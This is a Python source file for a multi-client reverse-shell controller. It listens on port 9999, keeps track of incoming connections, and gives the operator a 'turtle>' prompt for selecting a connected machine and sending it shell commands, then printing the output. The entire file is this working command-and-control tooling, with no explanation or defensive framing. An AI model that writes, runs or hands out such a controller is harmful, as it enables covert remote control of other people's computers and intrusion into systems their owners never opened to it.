import socket
import threading
import time
from queue import Queue


THREAD_NUMBERS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('Socket binding error: ' + str(msg))
        time.sleep(5)
        socket_bind()


def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(addr)
            print('\nConnection has been established: ' + addr[0])
        except:
            print('Error accepting connections')


def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print('Command not recognized')


def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '\t' + str(all_addresses[i][0]) + '\t' + str(all_addresses[i][1]) + '\n'
    print('--- Clients ---\n' + results)


def get_target(cmd):
    try:
        target = cmd.split(' ')[-1]
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to ' + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end = '')
        return conn
    except:
        print('Not a valid selection')
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end = '')
        except:
            print('Connection was lost')
            break


def create_workers():
    for _ in range(THREAD_NUMBERS):
        t = threading.Thread(target = work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


if __name__ == '__main__':
    create_workers()
    create_jobs()
